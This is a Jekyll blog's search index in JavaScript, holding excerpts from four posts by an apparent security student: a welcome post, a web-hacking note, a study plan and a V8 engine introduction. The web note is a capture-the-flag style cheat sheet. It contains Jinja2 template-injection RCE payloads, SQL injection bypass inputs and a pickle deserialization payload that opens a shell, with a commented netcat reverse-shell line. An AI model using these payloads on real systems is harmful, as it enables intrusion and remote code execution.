var store = [{
        "title": "Start Again",
        "excerpt":"My fourth github blog start 🎇   Using jekyll again ✨   And it can be set easily~ 🎃   This formula $f(x) = x^2$ is an example.   $$ \\lim_{x\\to 0}{\\frac{e^x-1}{2x}} \\overset{\\left[\\frac{0}{0}\\right]}{\\underset{\\mathrm{H}}{=}} \\lim_{x\\to 0}{\\frac{e^x}{2}}={\\frac{1}{2}} $$  $$ \\begin{aligned}  a^2 + b^2 &= c^2 \\\\  E &= M \\cdot C^2 \\\\  &= xy + \\mathbb{E}  \\end{aligned} $$  minimal-mistakes theme is better to expose my thoughts ordered by my favorites  ","categories": ["life"],
        "tags": ["hello","world"],
        "url": "/life/start-again/",
        "teaser": null
      },{
        "title": "web note (update 2021.10.27)",
        "excerpt":"post will be frequently updated   SSTI (Server Side Template Injection)  해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다.  This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.   ▶ jinja2  # 기본 {{ 4*4 }} =&gt; 16  # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }}  # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(\"ls\").read() }} {{ (config|attr(\"__class__\")).__init__.__globals__['os'].popen('cat flag').read() }}  # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read() }} {{ url_for.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls -al\").read()') }}   # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}       SQLI (sql injection)  해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.  The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.   1. Comment symbol     /* ~ */, -- ~, # (URL encoded : %23)   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1=1-- \" =&gt; Select * from tbl where id='' or 1=1--' user_input=\"' or 1=1#\" =&gt; Select * from tbl where id='' or 1=1# user_input=\"' or 1=1/*1234*/\" =&gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol)   2. with single quarter     id가 ''로 감싸져 있을 경우 '를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1='1\" =&gt; Select * from tbl where id='' or 1='1'   3. and, or, &amp;&amp;, ||, in, between, like  -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678'  -- &amp;&amp;, || (no space required) Select * from tbl where id='1234'&amp;&amp;pw='5678' Select * from tbl where id='1234'||pw='5678'  -- in Select * from tbl where id in '1234' and pw in '5678'  -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&lt;=score&lt;='C'  --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower   4. Internal function in mysql     char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;\"abc\")   mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..)   left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly))   version() : get mysql version   database() : get current database       python pickle deserialization  pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loads 함수에서 unpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다.   import os import pickle  class payload(object):   def __reduce__(self):     #return (os.system, ('ls', ))     #return (os.system, ('cat flag', ))     return (os.system, ('/bin/sh', ))     #return (os.system, ('/bin/sh | nc [ip] [port]', ))  pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway  $ id uid=1000(test) gid=1000(test) groups=1000(test)   update 예정.  ","categories": ["note"],
        "tags": [],
        "url": "/note/web-note-update/",
        "teaser": null
      },{
        "title": "Personal R&D plan beginning from 'now'",
        "excerpt":"UPDATED : 19 JUL 2024 13:00 UTC+9 KST That would be LAST UPDATE, Let’s plan more!   This is my plan to be finished until/after graduating.   Research     § must be finished until new year’s day §         Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete     Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete      Develop     § new year STUDY plan §         Making interpreter/compiler with Rust (With Chris Ohk, ..) s       Goal                 Try something “new”, Try Everything         Pass any awesome Univ.’s admission (Complete)         Pass drive license (Complete)         Dreamhack Wargame 1st                        Format Sniper (Learn &amp; Analyze about FSB, Solved :D)             Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)             Unibitmap (Solved :D)             dreamboard v2 (V8 : Solved :D)                             Purchase another laptop (DELL XPS 15 12th generation Intel CPU)         BoB (Best of the Best) 14th? 15th?         Try to be the BEST without competitive mind, Just enjoy                 ","categories": ["life"],
        "tags": [],
        "url": "/life/list-after-graduate/",
        "teaser": null
      },{
        "title": "[V8 Study] 00-introduction",
        "excerpt":"[!] 우선적으로 한글로 작성하여 추후 번역할 예정.   Summary  우리가 대중적으로 사용하는 Google Chrome browser에는 웹페이지를 동적으로 실행시키기 위해 javascript가 구동될 수 있도록 지원하고 있다. 그렇다면, JS를 원활하게 실행하고 컴파일하는 역할은 어떤 것이 맡고 있을까? 이 챕터에서는 내가 공부했던 chromium javascript engine인 V8에 대해서 알아보고자 한다.   V8의 구조는 어떻게 되어 있을까?   V8같은 경우 Chrome 구동 시 하나의 프로세스로 실행되어 heap 및 stack 메모리 영역을 관리하면서 Javascript의 각종 변수와 메소드를 실행하는 가장 핵심적인 execution file로 동작한다. 이외에 Task/Callback queue, Microtask queue, WebAPI 등 다양한 요소가 Chromium browser를 구성하고 동작하는데 사용된다.   가장 대표적인 역할은 javascript 코드를 컴파일된 컴퓨터에 최적화된 코드로 변환시켜 전달하게 된다는 것이다. 이때 JIT(Just-In-Time) Compiler라는 독창적인 컴파일러를 사용한다.   V8만의 특징은 무엇이 있을까?     우선 인터프리터와 컴파일러에 대해 알아야 할 것이다.     인터프리터            장점 : 한 줄 한 줄 변환하기 때문에 실행 속도가 빠르다.       단점 : 자바스크립트 코드가 복잡해질수록 점점 속도가 느려진다. 예를 들어, 같은 코드를 여러차례 반복하는 반복문의 경우, 같은 결과를 반복하는 것임에도 불구하고 코드를 한 줄 한 줄 읽는 방식에 의해 그때그때 실행된다.           컴파일러            장점 : 파일 전체를 한번에 읽어서 컴파일러는 작업을 단순화시킨다. 예를 들어 특정 함수를 10억번 반복해야 할 경우, 컴파일 과정에서 함수를 반복하는 것이 아니라 함수의 결과물을 반복하도록 컴파일 한다. 이처럼 불필요한 동작을 제거하는 컴파일러의 방식을 최적화, optimization이라고 한다.  (인터프리터는 optimize하지 않는다 )       단점 : 코드를 바로 실행하지 않고, 코드 실행 전 전체를 컴파일 하는 과정이 필요하기 때문에 초기에 속도가 느릴 수 밖에 없다.           자바스크립트 엔진의 내부를 공부하다가 잠시 인터프리터와 컴파일러의 간단한 개념과 장단점을 짚어봤다. 그러면 과연 V8 엔진은 어떤 방식을 취했길래 다른 자바스크립트 엔진보다 더 빠르고 효율적으로 자바스크립트 명령을 수행할 수 있을까? 바로 여기에서 V8 엔진의 독특한 언어 변환 도구인 JIT Compiler가 들어온다. JIT은 Just In Time의 약자이다.   JIT Compiler의 구조     V8 엔진은 다음과 같은 구조로 되어 있다.     Parser : 코드를 Lexical Analysis라는 과정을 통해 토큰으로 분해한다.   AST(Abstract Syntax Tree) : Parser에서 분해된 토큰을 바탕으로 추상적인 트리를 생성한다.   Ignition : AST에서 나온 트리를 V8의 인터프리터인 ignition에게 전달하고 이것을 인터프리터는 bytecode로 변환시킨다. (High-level Lang to Low-level Lang)   TurboFan, Profiler : bytecode를 실행하여 Human-readable Lang을 실행시키고, 그중 자주 사용되는 코드라고 판별된 코드 조각은 TurboFan으로 보내져 최적화를 수행하여 새로운 컴파일된 코드로 재구성된다. (이때 자주 사용되는 코드라는 말이 매우 추상적이므로 Profiler 라는 친구한테 사용 빈도 수 등을 수집하게끔 역할을 부여하고, 모인 데이터를 통해 Turbofan의 알고리즘대로 최적화를 한다)   Turbofan은 어떤 조건으로 최적화하는 걸까?          코드가 뜨겁고 안정적인 것, 쉽게 말하면 자주 호출되고(뜨겁고) 코드가 안 변함(안정적)이라는 것이다. 매번 같은 행동을 수행하는 반복문 내에 있는 코드 같은 경우가 여기에 해당하기 쉽다.            인터프리팅된 바이트 코드의 길이를 보고 특정 임계점을 넘기지 않으면 작은 함수라고 판단해서 최적화를 진행하는 것이다. 작고 단순한 함수는 크고 복잡한 함수보다 동작이 매우 추상적이거나 제한적인 확률이 높기 때문에 안정적이라고 볼 수 있다.       [!] 그러나, 컴파일러는 100% 완벽하지 못하기 때문에 의도와 다르게 발적화(deoptimization)가 일어날 수도 있다.   Next Topic  다음에는 V8에서 자료형이나 JS의 다양한 메소드가 어떤 식으로 저장이 되고 불러올 수 있는지를 알아보고자 한다.   reference     https://dkwjdi.tistory.com/194   https://github.com/danbev/learning-v8/blob/master/notes/intro.md  ","categories": ["note"],
        "tags": [],
        "url": "/note/V8-introduction/",
        "teaser": null
      }]
